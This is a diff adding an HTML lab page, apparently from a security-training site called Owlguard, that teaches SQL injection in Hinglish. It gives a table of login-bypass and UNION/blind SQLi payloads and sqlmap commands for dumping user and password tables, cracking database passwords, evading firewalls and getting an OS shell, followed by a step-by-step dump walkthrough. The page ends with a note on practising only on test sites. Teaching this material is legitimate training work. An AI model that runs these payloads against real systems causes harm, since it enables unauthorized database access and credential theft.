@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab 07 Manual | SQL Injection | Owlguard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="lab7.css" rel="stylesheet">
+  <link rel="icon" type="image/png" href="favicon.jpeg">
+</head>
+<body>
+
+    <nav>
+        <a href="index.html" class="logo">OWLGUARD</a>
+        <a href="index.html" style="color: #fff; text-decoration: none;"><i class="fas fa-arrow-left"></i> HOME </a>
+    </nav>
+
+    <header class="lab-header">
+        <p>LAB 07</p>
+        <h1>SQL Injection (SQLi) Manual</h1>
+        <p>Database vulnerabilities ko samajhna aur unhe exploit karke data fetch karna.</p>
+    </header>
+
+    <div class="content-container">
+
+        <section class="commands-section">
+            <h2><i class="fas fa-database"></i> 30 Essential SQLi Payloads & Commands</h2>
+            <p>Ye payloads check karte hain ki kya website input ko database query mein directly bhej rahi hai.</p>
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Payload / Command</th>
+                            <th>Kyu Use Karein? (Function)</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr><td class="payload-text">' OR 1=1 --</td><td>Bypass Login (Hamesha True condition).</td></tr>
+                        <tr><td class="payload-text">" OR 1=1 --</td><td>Double quote bypass login.</td></tr>
+                        <tr><td class="payload-text">admin' --</td><td>Login as admin without password.</td></tr>
+                        <tr><td class="payload-text">' ORDER BY 1--</td><td>Check number of columns in DB.</td></tr>
+                        <tr><td class="payload-text">' UNION SELECT NULL--</td><td>Check for Union based vulnerability.</td></tr>
+                        <tr><td class="payload-text">sqlmap -u "URL"</td><td>Automatic SQLi scan start karna.</td></tr>
+                        <tr><td class="payload-text">sqlmap -u "URL" --dbs</td><td>Database names list karna.</td></tr>
+                        <tr><td class="payload-text">sqlmap -u "URL" -D db_name --tables</td><td>Database ki tables nikalna.</td></tr>
+                        <tr><td class="payload-text">sqlmap -u "URL" -T users --columns</td><td>Users table ke columns dekhna.</td></tr>
+                        <tr><td class="payload-text">sqlmap -u "URL" -T users -C user,pass --dump</td><td>Data extract (User/Pass) karna.</td></tr>
+                        <tr><td class="payload-text">' OR SLEEP(5)--</td><td>Time-based blind SQLi check (5 sec delay).</td></tr>
+                        <tr><td class="payload-text">@@version</td><td>Database ka version check karna.</td></tr>
+                        <tr><td class="payload-text">user()</td><td>Current database user ka naam.</td></tr>
+                        <tr><td class="payload-text">database()</td><td>Current database ka naam.</td></tr>
+                        <tr><td class="payload-text">sqlmap -r request.txt</td><td>Burp ki request file se scan karna.</td></tr>
+                        <tr><td class="payload-text">sqlmap --batch</td><td>Saare questions ka default "Yes" answer.</td></tr>
+                        <tr><td class="payload-text">sqlmap --level=5 --risk=3</td><td>Deep/Aggressive scanning.</td></tr>
+                        <tr><td class="payload-text">sqlmap --random-agent</td><td>WAF bypass ke liye random browser use karna.</td></tr>
+                        <tr><td class="payload-text">sqlmap --proxy="http://127.0.0.1:8080"</td><td>Burp ke through traffic bhejna.</td></tr>
+                        <tr><td class="payload-text">sqlmap --os-shell</td><td>Server ka command shell access lena.</td></tr>
+                        <tr><td class="payload-text">sqlmap --tamper=space2comment</td><td>Firewall bypass (Spaces ko comments me badalna).</td></tr>
+                        <tr><td class="payload-text">AND 1=1</td><td>True condition for Blind SQLi.</td></tr>
+                        <tr><td class="payload-text">AND 1=2</td><td>False condition for Blind SQLi.</td></tr>
+                        <tr><td class="payload-text">sqlmap --current-user</td><td>Check current user privileges.</td></tr>
+                        <tr><td class="payload-text">sqlmap --passwords</td><td>Database user passwords crack karna.</td></tr>
+                        <tr><td class="payload-text">sqlmap --flush-session</td><td>Purana scan data clear karna.</td></tr>
+                        <tr><td class="payload-text">sqlmap --threads=10</td><td>Scan ki speed badhana.</td></tr>
+                        <tr><td class="payload-text">sqlmap --forms</td><td>Website ke HTML forms scan karna.</td></tr>
+                        <tr><td class="payload-text">sqlmap --wizard</td><td>Beginners ke liye step-by-step tool guide.</td></tr>
+                        <tr><td class="payload-text">sqlmap -hh</td><td>Advanced help menu dekhna.</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <section class="step-card">
+            <h3><i class="fas fa-vial"></i> Step 1: Vulnerability Testing</h3>
+            <p>Sabse pehle check karein ki parameter vulnerable hai ya nahi. URL ke end mein ek single quote (<code>'</code>) lagayein. Agar website error deti hai (Jaise: <em>SQL Syntax Error</em>), toh samajh lijiye darwaza khula hai.</p>
+            <div class="logic-box">
+                <strong>Logic:</strong> Website ' character ko filter nahi kar rahi, isliye wo database query ko tod raha hai.
+            </div>
+        </section>
+
+        <section class="step-card">
+            <h3><i class="fas fa-robot"></i> Step 2: Automated Scanning (sqlmap)</h3>
+            <p>Manual SQLi mushkil ho sakta hai, isliye hum industry standard tool <strong>sqlmap</strong> ka use karenge. Sabse pehle databases ki list nikalenge.</p>
+            <div class="terminal-box">sqlmap -u "http://target.com/product.php?id=1" --dbs</div>
+        </section>
+
+        <section class="step-card">
+            <h3><i class="fas fa-file-download"></i> Step 3: Data Dumping</h3>
+            <p>Jab database name mil jaye (Example: <em>user_db</em>), toh uske andar ki tables aur columns nikal kar data "Dump" karein.</p>
+            <div class="terminal-box">sqlmap -u "URL" -D user_db -T admin_users --dump</div>
+            <p>Isse aapko usernames aur hashed passwords mil jayenge.</p>
+        </section>
+
+        <section class="step-card" style="border-left: 5px solid #ff4b2b;">
+            <h3><i class="fas fa-user-shield"></i> Safety & Ethics</h3>
+            <p>SQL Injection se aap poora database delete bhi kar sakte hain (DROP TABLE). Isliye kabhi bhi kisi live production site par ye try na karein. Sirf test sites jaise <code>testphp.vulnweb.com</code> par practice karein.</p>
+        </section>
+
+    </div>
+
+    <footer>
+        <p>&copy;  2026 | Secured by OwlGuard | All Rights Reserved </p>
+    </footer>
+
+</body>
+</html>
